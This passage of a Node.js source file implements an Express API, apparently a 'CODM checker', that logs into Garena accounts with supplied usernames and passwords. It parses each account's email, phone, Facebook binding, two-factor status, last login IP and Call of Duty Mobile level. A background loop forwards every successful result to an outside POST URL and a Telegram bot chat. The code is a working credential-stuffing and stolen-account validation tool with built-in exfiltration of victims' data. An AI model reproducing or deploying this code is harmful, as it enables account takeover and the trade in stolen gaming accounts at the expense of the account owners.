         const status = error.response ? error.response.status : "N/A";

         if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            logger.warn(`CAPTCHA detected during acc info script request error for ${accountUsername}: ${errorStr}`);
            return "[API_ERROR] CAPTCHA Detected (Acc Info Script Request Error)";
        }
        if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
            logger.error(`Account info script timed out for ${accountUsername}`);
            return "[API_ERROR][Timeout] Account info script timeout";
        }
        logger.error(`Account info script request failed for ${accountUsername}: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
        return `[API_ERROR][Request] Account info script request failed: ${errorStr.substring(0, 100)}`;
    }


    // --- Process Account Info ---
    if (typeof initJsonResponse !== 'object' || initJsonResponse === null) {
        logger.error(`Account info processing failed - response was not a valid object for ${accountUsername}`);
        return "[API_ERROR] Failed to process account info response (Invalid structure)";
    }

    // Check for 'error' or lack of 'success' in the script's JSON response
    if (initJsonResponse.error || initJsonResponse.success === false) {
        const errorDetail = initJsonResponse.error || initJsonResponse.message || 'Unknown Error';
        const cleanErrorDetail = stripAnsiCodes(String(errorDetail));
        logger.warn(`Account info script returned error for ${accountUsername}: ${cleanErrorDetail}`);
        if (detectCaptchaInResponse(cleanErrorDetail)) {
            return "[API_ERROR] CAPTCHA Required (Acc Info Script Error Field)";
        }
        return `[API_ERROR] Account info script error: ${cleanErrorDetail.substring(0, 150)}`;
    }

    // Extract data (similar parsing logic as Python)
    const bindings = initJsonResponse.bindings || [];
    const accountStatus = stripAnsiCodes(String(initJsonResponse.status || 'Unknown'));
    let country = "N/A", lastLogin = "N/A", lastLoginWhere = "N/A", avatarUrl = "N/A";
    let fbName = "N/A", fbLink = "N/A", mobile = "N/A", email = "N/A";
    let facebookBound = "False", emailVerified = "False", authenticatorEnabled = "False", twoStepEnabled = "False";
    let shell = "0", ckzCount = "UNKNOWN", lastLoginIp = "N/A";

    if (Array.isArray(bindings)) {
        bindings.forEach(binding => {
            const bindingClean = stripAnsiCodes(String(binding));
            if (bindingClean.includes(":")) {
                try {
                    const parts = bindingClean.split(":", 2); // Split only on the first colon
                    const key = parts[0].trim().toLowerCase();
                    const value = parts[1].trim();
                    if (!value) return; // Skip if value is empty

                    switch (key) {
                        case "country": country = value; break;
                        case "lastlogin": if (!key.includes("from") && !key.includes("ip")) lastLogin = value; break;
                        case "lastloginfrom": lastLoginWhere = value; break;
                        case "lastloginip": lastLoginIp = value; break;
                        case "ckz": ckzCount = value; break;
                        case "garena shells":
                            const shellMatch = value.match(/(\d+)/);
                            shell = shellMatch ? shellMatch[1] : "0";
                            break;
                        case "facebook account":
                            if (value !== "N/A") { fbName = value; facebookBound = "True"; }
                            break;
                        case "fb link": fbLink = value; break;
                        case "avatar": avatarUrl = value; break;
                        case "mobile number": if (value !== "N/A") mobile = value; break;
                        case "tae": emailVerified = value.toLowerCase().includes("yes") ? "True" : "False"; break;
                        case "eta": if (value !== "N/A") email = value; break;
                        case "authenticator": authenticatorEnabled = value.toLowerCase().includes("enabled") ? "True" : "False"; break;
                        case "two-step verification": twoStepEnabled = value.toLowerCase().includes("enabled") ? "True" : "False"; break;
                    }
                } catch (parseErr) {
                    logger.warn(`Error parsing binding line for ${accountUsername}: '${bindingClean}' - ${parseErr.message}`);
                }
            }
        });
    } else {
        logger.warn(`Bindings data from script was not an array for ${accountUsername}: ${JSON.stringify(bindings)}`);
    }

     logger.info(`Account info parsed successfully for ${accountUsername}. Status: ${accountStatus}, Last Login IP: ${lastLoginIp}`);


    // --- Grant Token ---
    const grantCookies = {}; // Select specific cookies
    if (currentCookies.datadome) grantCookies.datadome = currentCookies.datadome;
    if (currentCookies.sso_key) grantCookies.sso_key = currentCookies.sso_key; // Might be set during login
    // Add other necessary cookies if identified

    const grantHeaders = {
        "Host": "auth.garena.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": `https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=${encodeURIComponent(REDIRECT_URL)}`,
        // "Accept-Encoding": "gzip, deflate, br, zstd", // Axios handles
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": selectedHeader['User-Agent'] || "Mozilla/5.0",
        'Cookie': formatCookiesForHeader(grantCookies) // Send selected cookies
    };
     // Add sec-ch-ua headers if present in selectedHeader
    Object.keys(selectedHeader).forEach(key => {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            grantHeaders[key] = selectedHeader[key];
        }
    });

    const grantDataPayload = {
        client_id: "100082",
        response_type: "token",
        redirect_uri: REDIRECT_URL,
        format: "json",
        id: _id // Use the same random ID
    };
    const grantData = new URLSearchParams(grantDataPayload).toString();

    logger.debug(`Attempting to grant token for ${accountUsername} with cookies: ${Object.keys(grantCookies).join(', ')}`);

    let accessToken = null;
    try {
        const grantUrl = "https://auth.garena.com/oauth/token/grant";
        const grantResponse = await axios.post(grantUrl, grantData, {
            headers: grantHeaders,
            timeout: 30000,
            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
            validateStatus: status => status >= 200 && status < 500
        });

        let grantTextClean = '';
         if(typeof grantResponse.data === 'object' && grantResponse.data !== null){
            try{ grantTextClean = stripAnsiCodes(JSON.stringify(grantResponse.data)); } catch { grantTextClean = "[Unstringifiable grant object]" }
         } else {
             grantTextClean = stripAnsiCodes(String(grantResponse.data));
         }

        logger.debug(`Grant token response status: ${grantResponse.status}, text snippet: ${grantTextClean.substring(0, 200)}`);

        if (detectCaptchaInResponse(grantTextClean)) {
            logger.warn(`CAPTCHA detected in grant token response body for ${accountUsername}.`);
            return "[API_ERROR] CAPTCHA Detected (Grant Token Response Body)";
        }
         if (grantResponse.status >= 400) {
             logger.warn(`Grant token request failed with status ${grantResponse.status} for ${accountUsername}: ${grantTextClean.substring(0, 150)}`);
              if (detectCaptchaInResponse(grantTextClean)) {
                 return "[API_ERROR] CAPTCHA Detected (Grant Token HTTP Error)";
             }
             return `[API_ERROR] Grant token failed (HTTP ${grantResponse.status})`;
         }


        // Process successful grant response
        const grantDataJson = (typeof grantResponse.data === 'object' && grantResponse.data !== null)
                            ? grantResponse.data
                            : JSON.parse(grantResponse.data); // Assume JSON on success
        logger.debug(`Grant token JSON response for ${accountUsername}: ${JSON.stringify(grantDataJson)}`);

        // Update cookies from grant response
         const grantRespCookies = parseCookies(grantResponse.headers['set-cookie']);
         currentCookies = { ...currentCookies, ...grantRespCookies }; // Merge again


        if (grantDataJson.error) {
            const errorMsg = grantDataJson.error;
            logger.warn(`Grant token error field for ${accountUsername}: ${errorMsg}`);
            if (detectCaptchaInResponse(errorMsg)) {
                return "[API_ERROR] CAPTCHA Required (Grant Token Error Field)";
            }
            return `[API_ERROR] Grant token failed: ${errorMsg}`;
        }
        if (!grantDataJson.access_token) {
            logger.error(`Grant token response missing access_token for ${accountUsername}: ${JSON.stringify(grantDataJson)}`);
            return "[API_ERROR] Grant token response missing 'access_token'";
        }

        accessToken = grantDataJson.access_token;
        logger.info(`Access token granted for ${accountUsername}.`);

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = error.response ? stripAnsiCodes(String(error.response.data)) : "";
         const status = error.response ? error.response.status : "N/A";

        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            logger.warn(`CAPTCHA detected during grant token request error for ${accountUsername}: ${errorStr}`);
            return "[API_ERROR] CAPTCHA Detected (Grant Token Request Error)";
        }
         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
             logger.error(`Grant token request timed out for ${accountUsername}`);
            return "[API_ERROR][Timeout] Grant token request timed out.";
         }
        if (error instanceof SyntaxError) { // JSON parsing error likely
             logger.error(`Failed to decode Grant Token JSON for ${accountUsername}: ${respText.substring(0, 200)} - Error: ${errorStr}`);
             return `[API_ERROR] Grant token failed: Non-JSON response (${errorStr})`;
        }
        logger.error(`Grant token request error for ${accountUsername}: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
        return `[API_ERROR][Request] Grant token request error: ${errorStr.substring(0, 100)}`;
    }

    // --- Show Level (CODM Check) ---
    const codmCheckCookies = {}; // Select necessary cookies for show_level
    if (currentCookies.datadome) codmCheckCookies.datadome = currentCookies.datadome;
    if (currentCookies.sso_key) codmCheckCookies.sso_key = currentCookies.sso_key;
    // 'token_session' might be set by grant response, include if present
    if (currentCookies.token_session) codmCheckCookies.token_session = currentCookies.token_session;

    logger.debug(`Checking CODM level with cookies: ${Object.keys(codmCheckCookies).join(', ')}`);
    const codmResultStr = await show_level(accessToken, selectedHeader, codmCheckCookies, proxies);
    logger.debug(`CODM check result string for ${accountUsername}: ${codmResultStr}`);

    // Check if show_level returned an error string
    if (typeof codmResultStr === 'string' && codmResultStr.startsWith("[")) {
        logger.warn(`CODM check failed or warned for ${accountUsername}: ${codmResultStr}`);
        return codmResultStr; // Propagate the error/warning string
    }

    // Process successful CODM result string
    let codmNickname = "N/A", codmLevelStr = "N/A", codmRegion = "N/A", uid = "N/A";
    let connectedGamesListForJson = [];
    let codmParseSuccess = false;

    if (typeof codmResultStr === 'string' && codmResultStr.includes("|") && codmResultStr.split("|").length === 4) {
        const parts = codmResultStr.split("|");
        codmNickname = parts[0].trim();
        codmLevelStr = parts[1].trim();
        codmRegion = parts[2].trim();
        uid = parts[3].trim();

        const isValidLevel = /^\d+$/.test(codmLevelStr); // Check if level is numeric
        if (isValidLevel && codmNickname && codmRegion && uid && codmNickname !== 'N/A') {
            logger.info(`Successfully parsed CODM details for ${accountUsername}: Nick=${codmNickname}, Lvl=${codmLevelStr}`);
            connectedGamesListForJson.push({
                game: "CODM",
                region: codmRegion,
                level: codmLevelStr, // Keep as string initially for formatting
                nickname: codmNickname,
                uid: uid
            });
            codmParseSuccess = true;
        } else {
            logger.warn(`CODM result string parsed but contained invalid data: ${codmResultStr}`);
            return `[CODM_FAIL] Parsed invalid CODM data: ${codmResultStr.substring(0, 100)}`;
        }
    } else {
        // This case might indicate the external script didn't return the expected format even after success checks
        logger.warning(`CODM check for ${accountUsername} returned unexpected format after success path: ${codmResultStr}`);
        // It's possible show_level filtered out errors but format was still wrong
        return `[CODM_FAIL] Unexpected CODM data format post-check: ${String(codmResultStr).substring(0, 100)}`;
    }

    if (!codmParseSuccess) {
         // This should theoretically not be reached if logic above is correct, but as a safeguard:
         logger.error(`CODM parsing flag not set despite reaching end for ${accountUsername}. Result: ${codmResultStr}`);
         return `[CODM_FAIL] Internal parsing state error after CODM check.`;
    }

    // --- Format Final Result ---
    const resultDict = formatResultDict(
        lastLogin, lastLoginWhere, country, shell, avatarUrl, mobile,
        facebookBound, emailVerified, authenticatorEnabled, twoStepEnabled,
        connectedGamesListForJson, fbName, fbLink, email, date,
        accountUsername, password, ckzCount, lastLoginIp, accountStatus
    );
    logger.info(`Full check successful for ${accountUsername}. Level: ${codmLevelStr}`);
    return resultDict; // Return the formatted result object
}

function formatResultDict(
    lastLogin, lastLoginWhere, country, shellStr, avatarUrl, mobile,
    facebookBoundStr, emailVerifiedStr, authenticatorEnabledStr, twoStepEnabledStr,
    connectedGamesData, fbName, fbLink, email, date,
    username, password, // Password included here, consider redacting if logging/forwarding raw
    ckzCount, lastLoginIp, accountStatus
) {

    let codmInfoJson = { status: "Not Linked", level: null };
    if (connectedGamesData && connectedGamesData.length > 0) {
        const gameData = connectedGamesData[0]; // Assuming only CODM for now
        if (gameData.game === "CODM") {
            let levelVal = null;
            try {
                levelVal = parseInt(gameData.level, 10); // Parse level string to integer
                if (isNaN(levelVal)) levelVal = null; // Handle non-numeric case
            } catch { /* ignore */ }

            codmInfoJson = {
                status: "Linked",
                game: "CODM",
                region: gameData.region || null,
                level: levelVal,
                nickname: gameData.nickname || null,
                uid: gameData.uid || null
            };
        }
    }

    let shellValue = 0;
    try {
        shellValue = parseInt(shellStr, 10);
        if (isNaN(shellValue)) shellValue = 0;
    } catch { /* ignore */ }

    // Helper to clean 'N/A' or empty values to null for cleaner JSON
    const cleanNa = (value) => {
        if (value === "N/A" || value === null || value === "" || String(value).toLowerCase() === "unknown") {
            return null;
        }
        return value;
    };

    const resultData = {
        owner: EXPECTED_OWNER,
        checker_by: "@YISHUX",
        timestamp_utc: new Date().toISOString(),
        check_run_id: date, // Timestamp from start of check
        username: username,
        // password: password, // Consider REMOVING password from the final result for security
        account_status: cleanNa(accountStatus),
        account_country: cleanNa(country),
        garena_shells: shellValue,
        avatar_url: cleanNa(avatarUrl),
        last_login_time: cleanNa(lastLogin),
        last_login_location: cleanNa(lastLoginWhere),
        last_login_ip: cleanNa(lastLoginIp),
        bindings: {
            mobile_number: cleanNa(mobile),
            email_address: cleanNa(email),
            facebook_name: cleanNa(fbName),
            facebook_link: cleanNa(fbLink),
        },
        security: {
            mobile_bound: cleanNa(mobile) !== null,
            email_verified: emailVerifiedStr === "True",
            facebook_linked: facebookBoundStr === "True",
            google_authenticator_enabled: authenticatorEnabledStr === "True",
            two_step_verification_enabled: twoStepEnabledStr === "True",
        },
        codm_details: codmInfoJson,
        ckz_count: cleanNa(ckzCount) === "UNKNOWN" ? null : cleanNa(ckzCount), // Clean UNKNOWN specifically
    };

    return resultData;
}


async function performCheck(username, password) {
    logger.debug(`Starting perform_check for ${username}`);
    const date = getCurrentTimestamp(); // Timestamp for this check run
    const randomId = String(Math.floor(Math.random() * (999999999999 - 100000000000 + 1)) + 100000000000); // 12-digit random number

    try {
        const { finalCookies: initialCookies, headers } = await getRequestData(); // Get headers and empty cookies obj
        let currentCookies = { ...initialCookies }; // Make a mutable copy for this check

        const preloginParams = {
            app_id: "100082",
            account: username,
            format: "json",
            id: randomId
        };
        const preloginUrl = "https://auth.garena.com/api/prelogin";

        logger.debug(`Performing prelogin request for ${username}`);
        let preloginResponse;
        try {
            preloginResponse = await axios.get(preloginUrl, {
                params: preloginParams,
                headers: headers, // Use base headers from getRequestData
                 // Cookies are initially empty, send header if needed (usually not for prelogin)
                 // 'Cookie': formatCookiesForHeader(currentCookies)
                timeout: 20000, // 20 seconds
                validateStatus: status => status >= 200 && status < 500
            });

            let preloginTextClean = '';
             if(typeof preloginResponse.data === 'object' && preloginResponse.data !== null){
                 try { preloginTextClean = stripAnsiCodes(JSON.stringify(preloginResponse.data)); } catch { preloginTextClean = '[Unstringifiable prelogin object]' }
             } else {
                 preloginTextClean = stripAnsiCodes(String(preloginResponse.data));
             }
            logger.debug(`Prelogin response status: ${preloginResponse.status}, text snippet: ${preloginTextClean.substring(0, 200)}`);

            if (detectCaptchaInResponse(preloginTextClean) || (preloginResponse.status >= 400 && detectCaptchaInResponse(preloginTextClean))) {
                logger.warn(`CAPTCHA detected in prelogin response for ${username}.`);
                return "[API_ERROR] CAPTCHA Detected (Prelogin Response)";
            }

            // Handle HTTP errors after CAPTCHA
             if (preloginResponse.status === 403) {
                 logger.warn(`Prelogin forbidden (403) for ${username}: ${preloginTextClean.substring(0, 100)}`);
                 return `[API_ERROR] Prelogin Forbidden (403)`;
             }
             if (preloginResponse.status === 429) {
                 logger.warn(`Prelogin rate limited (429) for ${username}`);
                 return "[API_ERROR][RateLimit] Prelogin Rate Limited (429)";
             }
             if (preloginResponse.status >= 400) {
                 logger.warn(`Prelogin HTTP Error ${preloginResponse.status} for ${username}: ${preloginTextClean.substring(0, 200)}`);
                 return `[API_ERROR][HTTP] Prelogin HTTP ${preloginResponse.status}`;
             }

        } catch (error) {
            const errorStr = stripAnsiCodes(error.toString());
            const status = error.response ? error.response.status : "N/A";

             if (detectCaptchaInResponse(errorStr) || (error.response && detectCaptchaInResponse(String(error.response.data)))) {
                logger.warn(`CAPTCHA detected during prelogin request error for ${username}: ${errorStr}`);
                return "[API_ERROR] CAPTCHA Detected (Prelogin Request Error)";
            }
             if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
                logger.error(`Prelogin timed out for ${username}`);
                return "[API_ERROR][Timeout] Prelogin Timed Out";
             }
            logger.error(`Prelogin request failed for ${username}: ${errorStr} (Status: ${status})`);
            return `[API_ERROR][Request] Prelogin Request Failed: ${errorStr.substring(0, 100)}`;
        }

        // Process successful prelogin response
        let preloginJson;
        try {
             preloginJson = (typeof preloginResponse.data === 'object' && preloginResponse.data !== null)
                         ? preloginResponse.data
                         : JSON.parse(preloginResponse.data);
             logger.debug(`Prelogin JSON response for ${username}: ${JSON.stringify(preloginJson)}`);
        } catch (e) {
            const preloginTextClean = stripAnsiCodes(String(preloginResponse.data));
            logger.error(`Invalid Prelogin JSON for ${username}: ${preloginTextClean.substring(0, 200)}`);
            return `[API_ERROR] Invalid Prelogin JSON`;
        }

        // Extract cookies from prelogin (especially datadome)
        const preloginCookies = parseCookies(preloginResponse.headers['set-cookie']);
        const datadomeCookie = preloginCookies.datadome || null;
        if (datadomeCookie) {
             // Add *all* cookies from prelogin to current state for checkLogin
             currentCookies = { ...currentCookies, ...preloginCookies };
             logger.debug(`Datadome cookie obtained from prelogin for ${username}. All prelogin cookies merged.`);
        } else {
            logger.debug(`No Datadome cookie in prelogin response for ${username}.`);
             // Still merge other cookies if any
             currentCookies = { ...currentCookies, ...preloginCookies };
        }

        // Check for errors in prelogin JSON data
        if (preloginJson.error) {
            const errorMsg = preloginJson.error;
            logger.warn(`Prelogin error field for ${username}: ${errorMsg}`);
            if (detectCaptchaInResponse(errorMsg)) {
                return "[API_ERROR] CAPTCHA Required (Prelogin Error Field)";
            }
            if (errorMsg === 'error_account_does_not_exist') {
                return "[LOGIN_FAIL] Account doesn't exist"; // Fail early if account not found
            }
             // Handle other potential prelogin errors
            return `[API_ERROR] Prelogin Error: ${errorMsg}`;
        }

        const v1 = preloginJson.v1;
        const v2 = preloginJson.v2;
        if (!v1 || !v2) {
            logger.error(`Prelogin data missing v1/v2 for ${username}: ${JSON.stringify(preloginJson)}`);
            return "[API_ERROR] Prelogin Data Missing (v1/v2)";
        }

        // Encrypt password using v1/v2
        const encryptedPassword = getEncryptedPassword(password, v1, v2);

        // Call the main login and checking logic
        const loginResult = await checkLogin(
            username,
            randomId,
            encryptedPassword,
            password, // Pass original password for potential use in formatting/forwarding
            headers, // Pass the base headers used
            currentCookies, // Pass cookies obtained so far (including from prelogin)
            datadomeCookie, // Pass datadome specifically for checkLogin's logic
            date, // Pass the check run timestamp
            null // Proxies not implemented here
        );

        return loginResult; // Return the result (object on success, string on error)

    } catch (error) {
        // Catch unexpected errors during the performCheck orchestration
        const errStr = stripAnsiCodes(error.toString());
        if (detectCaptchaInResponse(errStr)) { // Catch-all for captcha mentioned anywhere
            logger.warn(`CAPTCHA potentially detected during unexpected error in perform_check for ${username}.`);
            return "[API_ERROR] CAPTCHA Detected (perform_check Unexpected)";
        }
        logger.error(`Unexpected error in perform_check for ${username}: ${error.stack || error}`);
        return `[API_ERROR] Unexpected Error in perform_check: ${errStr.substring(0, 100)}`;
    }
}


// --- Express App Setup ---
const app = express();

// Middleware for logging requests (optional)
app.use((req, res, next) => {
    logger.debug(`Incoming Request: ${req.method} ${req.url} from ${req.ip}`);
    next();
});

// --- Routes ---

// Root Route
app.get('/', (req, res) => {
    const responseData = {
        status: "ok",
        message: "S1N CODM Checker API (Node.js) is running.",
        owner: EXPECTED_OWNER
    };
    // Ensure owner tag consistency
    if (responseData.owner !== EXPECTED_OWNER) {
        logger.crit("!!! CRITICAL: Owner tag modified or missing in root response! Forcing correct owner. !!!");
        responseData.owner = EXPECTED_OWNER;
    }
    res.status(200).json(responseData);
});

// CODM Check Route
app.get('/codm', async (req, res) => {
    const username = req.query.username;
    const password = req.query.password;
    const clientIp = req.ip || req.connection.remoteAddress;

    logger.info(`Request received from ${clientIp}: user=${username}`); // Avoid logging password here

    if (!username || !password) {
        logger.warn(`Missing username or password from ${clientIp}`);
        const responseData = {
            status: "error",
            message: "Missing username or password parameter",
            owner: EXPECTED_OWNER
        };
        return res.status(400).json(responseData);
    }

    try {
        // Perform the check
        const result = await performCheck(username, password);

        let responseData = null;
        let statusCode = 200;

        if (typeof result === 'object' && result !== null) {
            // Success Case
            const level = result.codm_details?.level ?? 'N/A'; // Safely access level
            logger.info(`Check successful for ${username}. Level: ${level}`);

             // Remove password before sending/forwarding if present
             const resultToSend = { ...result };
             delete resultToSend.password; // Remove password field if it exists

            responseData = { status: "success", data: resultToSend, owner: EXPECTED_OWNER };
            statusCode = 200;

            // Add to forwarding queue if enabled
            if (FORWARD_POST_URL || (TELEGRAM_BOT_TOKEN && FORWARD_CHAT_ID)) {
                // Forward the version *without* the password
                forwardQueue.push({ username, resultData: resultToSend });
                logger.debug(`Added successful check for ${username} to forward queue.`);
            } else {
                logger.debug("Forwarding disabled, skipping queue.");
            }

        } else if (typeof result === 'string') {
            // Failure Case (result is an error string)
            logger.warn(`Check failed for ${username}: ${result}`);
            const errorDetail = result.includes("]") ? result.split("]", 1)[1].trim() : result;
            let message = "Check failed";
            statusCode = 500; // Default internal error

            if (result.startsWith("[API_ERROR]")) {
                message = "Checker API error";
                statusCode = 500; // Default API error
                if (result.includes("CAPTCHA")) statusCode = 429; // Too Many Requests (Captcha)
                if (result.includes("Timeout")) statusCode = 504; // Gateway Timeout
                if (result.includes("RateLimit") || result.includes("Rate Limited")) statusCode = 429;
                 if (result.includes("Connection")) statusCode = 503; // Service Unavailable
                 if (result.includes("Forbidden") || result.includes("HTTP Error 403")) statusCode = 403; // Forbidden
                 if (result.includes("HTTP")) { // Try to extract specific HTTP code if possible
                    const httpMatch = result.match(/HTTP(?: Error)? (\d{3})/);
                    if(httpMatch && httpMatch[1]) {
                        const httpCode = parseInt(httpMatch[1], 10);
                        if(httpCode >= 400 && httpCode < 600) statusCode = httpCode;
                    }
                 }

            } else if (result.startsWith("[LOGIN_FAIL]")) {
                message = "Login failed";
                statusCode = 403; // Forbidden (auth failure)
            } else if (result.startsWith("[CODM_FAIL]") || result.startsWith("[CODM_WARN]")) {
                message = "CODM check failed or warned post-login";
                statusCode = 502; // Bad Gateway (issue with upstream CODM check)
            }

            responseData = { status: "error", message: message, detail: errorDetail, owner: EXPECTED_OWNER };

        } else {
            // Unexpected result type
            logger.error(`Unexpected result type from perform_check for ${username}: ${typeof result}`);
            responseData = { status: "error", message: "Internal server error (unexpected result type)", owner: EXPECTED_OWNER };
            statusCode = 500;
        }

        // Final check for owner tag consistency before sending response
        if (responseData && responseData.owner !== EXPECTED_OWNER) {
             logger.crit(`!!! CRITICAL: Owner tag modified or missing before sending response! Expected '${EXPECTED_OWNER}', Found: '${responseData.owner}'. Forcing correct owner. !!!`);
             responseData.owner = EXPECTED_OWNER;
        }
         if (responseData?.data && responseData.data.owner !== EXPECTED_OWNER) {
            logger.crit(`!!! CRITICAL: Owner tag modified or missing within 'data' field! Forcing correct owner. !!!`);
            responseData.data.owner = EXPECTED_OWNER;
         }


        return res.status(statusCode).json(responseData);

    } catch (error) {
        // Catch errors in the route handler itself
        logger.error(`Critical error processing request for ${username}: ${error.stack || error}`);
        let responseData = {
            status: "error",
            message: "Internal server error",
            detail: stripAnsiCodes(error.toString()).substring(0,150), // Sanitize error message
            owner: EXPECTED_OWNER
        };
         // Ensure owner tag in critical error
        if (responseData.owner !== EXPECTED_OWNER) {
            logger.crit(`!!! CRITICAL: Owner tag modified or missing during critical error handling! Forcing correct owner. !!!`);
            responseData.owner = EXPECTED_OWNER;
        }
        return res.status(500).json(responseData);
    }
});


// --- Result Forwarder Logic ---

async function resultForwarderLoop() {
    const forwarderName = "ResultForwarder";
    logger.info(`${forwarderName} loop started.`);
    logger.info(`${forwarderName}: POST Forwarding to ${FORWARD_POST_URL || 'DISABLED'}`);
    logger.info(`${forwarderName}: Telegram Forwarding to ${FORWARD_CHAT_ID ? `Chat ID ${FORWARD_CHAT_ID}` : 'DISABLED'} ${TELEGRAM_BOT_TOKEN ? '(Token Configured)' : '(Token Missing)'}`);

    while (true) {
        if (forwardQueue.length > 0) {
            const item = forwardQueue.shift(); // Get the oldest item
            if (!item) continue; // Should not happen, but safeguard

            const { username, resultData } = item;
            logger.debug(`[${forwarderName}] Dequeued successful check for ${username} for forwarding.`);

             // Ensure owner tag consistency before forwarding
            if (resultData && resultData.owner !== EXPECTED_OWNER) {
                 logger.warn(`[${forwarderName}] Correcting owner tag before forwarding for ${username}.`);
                 resultData.owner = EXPECTED_OWNER;
            }


            // --- POST Forwarding ---
            if (FORWARD_POST_URL && resultData) {
                try {
                    logger.debug(`[${forwarderName}] Attempting POST forward for ${username} to ${FORWARD_POST_URL}`);
                    const postHeaders = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'CODMCheckerForwarderNode/1.0' // Identify the forwarder
                    };

                    const response = await axios.post(FORWARD_POST_URL, resultData, {
                        headers: postHeaders,
                        timeout: 15000 // 15 seconds
                    });
                    // Log success only on 2xx status codes
                    if (response.status >= 200 && response.status < 300) {
                        logger.info(`[${forwarderName}] Successfully forwarded check for ${username} via POST to ${FORWARD_POST_URL} (Status: ${response.status})`);
                    } else {
                         // Log non-2xx responses as warnings/errors
                         logger.warn(`[${forwarderName}] Forwarding POST request for ${username} to ${FORWARD_POST_URL} completed with status ${response.status}. Response: ${String(response.data).substring(0,100)}`);
                    }
                } catch (error) {
                     const status = error.response ? error.response.status : 'N/A';
                     const respData = error.response ? String(error.response.data).substring(0,100) : '';
                    logger.error(`[${forwarderName}] Failed to forward check for ${username} via POST to ${FORWARD_POST_URL}: ${error.message} (Status: ${status}) Response: ${respData}`);
                }
            }

            // --- Telegram Forwarding ---
            if (TELEGRAM_BOT_TOKEN && FORWARD_CHAT_ID && resultData) {
                try {
                    logger.debug(`[${forwarderName}] Attempting Telegram forward for ${username} to ${FORWARD_CHAT_ID}`);

                    const codmDetails = resultData.codm_details || {};
                    const level = codmDetails.level ?? 'N/A';
                    const nickname = codmDetails.nickname ?? 'N/A';
                    const region = codmDetails.region ?? 'N/A';
                    const uid = codmDetails.uid ?? 'N/A';
                    const shells = resultData.garena_shells ?? 0;
                    const country = resultData.account_country ?? 'N/A';
                    const lastLogin = resultData.last_login_time ?? 'N/A';
                    const lastIp = resultData.last_login_ip ?? 'N/A';
                    const email = resultData.bindings?.email_address ?? 'N/A';
                    const mobile = resultData.bindings?.mobile_number ?? 'N/A';

                    // Use lodash escape for HTML safety
                    const escape = (str) => _.escape(String(str));

                    const message = `
✅ <b>Check Successful</b> ✅

👤 <b>Username:</b> <code>${escape(username)}</code>
🎮 <b>CODM Nick:</b> ${escape(nickname)}
📊 <b>CODM Level:</b> ${level}
🌍 <b>CODM Region:</b> ${escape(region)}
🆔 <b>CODM UID:</b> <code>${escape(uid)}</code>
💰 <b>Shells:</b> ${shells}
--- Account Info ---
🗺️ <b>Country:</b> ${escape(country)}
📧 <b>Email:</b> ${escape(email)}
📱 <b>Mobile:</b> ${escape(mobile)}
🕒 <b>Last Login:</b> ${escape(lastLogin)}
📍 <b>Last Login IP:</b> <code>${escape(lastIp)}</code>

<i>Checked by ${escape(EXPECTED_OWNER)} API</i>
                    `.trim(); // Trim whitespace

                    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                    const payload = {
                        chat_id: FORWARD_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    };
                    const tgHeaders = { 'Content-Type': 'application/json' };

                    const tgResponse = await axios.post(telegramUrl, payload, {
                        headers: tgHeaders,
                        timeout: 10000 // 10 seconds
                    });

                    if (tgResponse.data && tgResponse.data.ok) {
                        logger.info(`[${forwarderName}] Successfully forwarded check for ${username} via Telegram request to ${FORWARD_CHAT_ID}.`);
                    } else {
                        // Log Telegram API error description if available
                        const errorDesc = tgResponse.data?.description || 'Unknown error from Telegram API';
                        logger.error(`[${forwarderName}] Telegram API returned error for ${username} to ${FORWARD_CHAT_ID}: ${errorDesc} (Status: ${tgResponse.status})`);
                    }

                } catch (error) {
                     const status = error.response ? error.response.status : 'N/A';
                     const respData = error.response?.data ? JSON.stringify(error.response.data).substring(0,100) : '';
                    logger.error(`[${forwarderName}] Failed to send Telegram message request to ${FORWARD_CHAT_ID} for user ${username}: ${error.message} (Status: ${status}) Response: ${respData}`);
                }
            } // End Telegram Check

            // Small delay between processing items if queue was busy
            await new Promise(resolve => setTimeout(resolve, 50));

        } else {
            // Queue is empty, wait longer before checking again
            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
        }
    } // End while true
}

// --- Start Server ---
async function startServer() {
    logger.info(`--- API Checker Script Started (PID: ${process.pid}, Node: ${process.version}) ---`);
    logger.info(`Platform: ${os.platform()}, Arch: ${os.arch()}, Hostname: ${os.hostname()}`);

    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" || !FORWARD_CHAT_ID) {
         logger.warn("Telegram Bot Token or Forward Chat ID not configured correctly. Telegram forwarding feature may be disabled or use default admin ID.");
    } else {
        logger.info(`Telegram forwarding configured for Chat ID: ${FORWARD_CHAT_ID}`);
    }
     if (!FORWARD_POST_URL) {
        logger.info("POST URL forwarding is disabled.");
     } else {
        logger.info(`POST URL forwarding enabled for: ${FORWARD_POST_URL}`);
     }
     if (!EXPECTED_OWNER || !EXPECTED_OWNER.startsWith('t.me/')) {
        logger.warn(`EXPECTED_OWNER constant (${EXPECTED_OWNER}) doesn't look like a valid Telegram username link. Ensure it is set correctly.`);
     }


    // Start the forwarder loop (don't await it, let it run in background)
    resultForwarderLoop().catch(err => {
         logger.error(`CRITICAL ERROR in ResultForwarder loop: ${err.stack || err}`);
         // Consider process exit or restart logic here if the forwarder is critical
